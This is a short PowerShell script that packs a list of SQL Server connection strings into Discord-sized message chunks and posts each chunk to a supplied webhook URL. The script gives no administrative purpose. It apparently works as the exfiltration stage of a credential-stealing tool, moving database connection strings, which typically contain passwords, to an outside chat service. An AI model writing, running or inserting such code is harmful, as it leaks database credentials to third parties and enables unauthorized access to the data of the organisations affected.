param (
    [string[]]$ConnectionStrings,
    [string]$WebhookUrl
)

# Maximum message length for Discord
$maxLength = 1900
$chunks = @()

# Start first message chunk with header and code block
$currentChunk = @"
**🗃️ SQL Server Connection Strings**

"@

#Add each connection string, splitting into chunks if needed
foreach ($line in $ConnectionStrings) {
    if (($currentChunk.Length + $line.Length + 1) -ge $maxLength) {
        $chunks += $currentChunk
        $currentChunk = ""
    }
    $currentChunk += "$line`n"
}
$chunks += $currentChunk


#Send each chunk as a separate message
foreach ($chunk in $chunks) {
    $body = @{
        content = $chunk
    } | ConvertTo-Json -Depth 2 -Compress

    Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType 'application/json' -Body $body
    Start-Sleep -Milliseconds 500
}